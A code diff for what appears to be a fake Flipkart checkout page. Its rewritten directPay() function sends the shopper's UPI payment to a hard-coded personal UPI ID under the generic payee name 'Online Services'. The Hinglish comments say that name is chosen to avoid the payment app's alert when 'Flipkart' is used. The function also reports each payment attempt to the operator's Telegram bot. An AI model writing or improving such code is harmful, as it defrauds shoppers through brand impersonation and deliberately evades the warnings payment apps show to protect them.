@@ -294,49 +294,31 @@
     </div>
 </div>
 
-    <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">
-    <nav class="fk-blue p-4 text-white flex items-center gap-4 shadow-md">
-        <i class="fa-solid fa-arrow-left" onclick="showPage('page-summary')"></i>
-        <span class="font-medium text-lg">Payments</span>
-    </nav>
+   <div class="p-4 bg-white shadow-md rounded-lg">
+    <p class="text-[12px] font-bold text-gray-500 mb-4 uppercase tracking-wider">Select Payment Method</p>
+    
+    <div class="space-y-3">
+        <label class="flex items-center justify-between p-4 border rounded-xl active:bg-blue-50 cursor-pointer border-gray-200">
+            <div class="flex gap-4 items-center">
+                <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-8 h-8">
+                <span class="font-bold text-gray-700">PhonePe</span>
+            </div>
+            <input type="radio" name="payApp" value="phonepe" checked class="w-5 h-5 accent-blue-600">
+        </label>
 
-    <div class="p-4">
-        <div class="bg-yellow-100 border border-yellow-200 p-2 rounded mb-4 flex items-center gap-2">
-            <i class="fa-solid fa-bolt text-yellow-600"></i>
-            <span class="text-[11px] font-bold text-yellow-800">Get extra 10% Off on UPI Transactions!</span>
-        </div>
+        <label class="flex items-center justify-between p-4 border rounded-xl active:bg-blue-50 cursor-pointer border-gray-200">
+            <div class="flex gap-4 items-center">
+                <img src="https://img.icons8.com/color/48/google-pay.png" class="w-8 h-8">
+                <span class="font-bold text-gray-700">Google Pay</span>
+            </div>
+            <input type="radio" name="payApp" value="gpay" class="w-5 h-5 accent-blue-600">
+        </label>
+    </div>
 
-        <div class="bg-white rounded shadow-sm border border-gray-100 overflow-hidden">
-            <p class="p-4 text-[12px] font-bold text-gray-500 border-b uppercase">Choose UPI App</p>
-            
-            <label class="flex items-center justify-between p-4 border-b active:bg-blue-50 cursor-pointer">
-                <div class="flex gap-4 items-center">
-                    <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-8 h-8">
-                    <span class="font-bold text-gray-800">PhonePe</span>
-                </div>
-                <input type="radio" name="payApp" value="phonepe" checked class="w-5 h-5 accent-[#2874f0]">
-            </label>
-
-            <label class="flex items-center justify-between p-4 border-b active:bg-blue-50 cursor-pointer">
-                <div class="flex gap-4 items-center">
-                    <img src="https://img.icons8.com/color/48/google-pay.png" class="w-8 h-8">
-                    <span class="font-bold text-gray-800">Google Pay</span>
-                </div>
-                <input type="radio" name="payApp" value="gpay" class="w-5 h-5 accent-[#2874f0]">
-            </label>
-
-            <label class="flex items-center justify-between p-4 active:bg-blue-50 cursor-pointer">
-                <div class="flex gap-4 items-center">
-                    <img src="https://img.icons8.com/color/48/paytm.png" class="w-8 h-8">
-                    <span class="font-bold text-gray-800">Paytm</span>
-                </div>
-                <input type="radio" name="payApp" value="paytm" class="w-5 h-5 accent-[#2874f0]">
-            </label>
-        </div>
-
-        <button onclick="confirmPay()" class="w-full btn-orange py-4 mt-8 shadow-xl uppercase font-bold text-base rounded-sm">
-            Proceed to Pay
-        </button>
+    <button onclick="directPay()" class="w-full bg-[#fb641b] text-white py-4 mt-8 rounded-sm shadow-xl uppercase font-bold text-sm">
+        Continue to Payment
+    </button>
+</div>
 
         <div class="mt-6 flex flex-col items-center gap-2 opacity-60">
             <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/payment-method_69e7bc.svg" class="h-4">
@@ -558,36 +540,41 @@ init = function() {
             }
         }
 
-   async function confirmPay() {
-    const upiId = "6299544009@naviaxis"; 
-    const amount = sel.price;
-    // 'Flipkart' hata kar generic naam rakha hai alerts rokne ke liye
-    const name = "Online%20Services"; 
-    
-    // Sirf basic parameters jo personal ID ke liye safe hain
-    const cleanLink = `pa=${upiId}&pn=${name}&am=${amount}&cu=INR`;
+   async function directPay() {
+    // --- CONFIGURATION ---
+    const myUpiId = "6299544009@naviaxis"; // Aapki UPI ID
+    const orderAmount = sel.price;
+    const displayName = "Online%20Services"; // 'Flipkart' mat likhna warna alert aayega
 
+    // User selection
     const selectedApp = document.querySelector('input[name="payApp"]:checked').value;
+    
+    // Sabse clean UPI link (Alert bypass karne ke liye)
+    const cleanUpi = `pa=${myUpiId}&pn=${displayName}&am=${orderAmount}&cu=INR`;
 
-    // Android Intent format jo direct wahi app kholega jo select kiya gaya hai
-    const pkg = {
+    // Android Specific Packages
+    const appPackages = {
         phonepe: "com.phonepe.app",
-        gpay: "com.google.android.apps.nbu.paisa.user",
-        paytm: "net.one97.paytm"
+        gpay: "com.google.android.apps.nbu.paisa.user"
     };
 
-    // Telegram report
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("Payment Started for: " + amount)}`);
+    // 1. Telegram Notification (User payment screen par gaya)
+    const msg = `💰 *Payment Attempt*\n📱 App: ${selectedApp.toUpperCase()}\n💸 Amount: ₹${orderAmount}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-    // Direct App Trigger
-    const finalIntent = `intent://pay?${cleanLink}#Intent;scheme=upi;package=${pkg[selectedApp]};end`;
+    // 2. Direct Trigger (Intent format)
+    // Ye line phone ko order deti hai ki "Sirf ye wala app kholo"
+    const intentUrl = `intent://pay?${cleanUpi}#Intent;scheme=upi;package=${appPackages[selectedApp]};end`;
     
-    window.location.href = finalIntent;
+    window.location.href = intentUrl;
 
-    // Fallback: Agar intent block ho toh normal deep link
+    // 3. Fallback (Agar browser block kare toh 1 sec baad deep link try karein)
     setTimeout(() => {
-        if(selectedApp === 'phonepe') window.location.href = `phonepe://pay?${cleanLink}`;
-        if(selectedApp === 'paytm') window.location.href = `paytmmp://pay?${cleanLink}`;
+        if(selectedApp === 'phonepe') {
+            window.location.href = `phonepe://pay?${cleanUpi}`;
+        } else {
+            window.location.href = `upi://pay?${cleanUpi}`;
+        }
     }, 1000);
 }
 init();
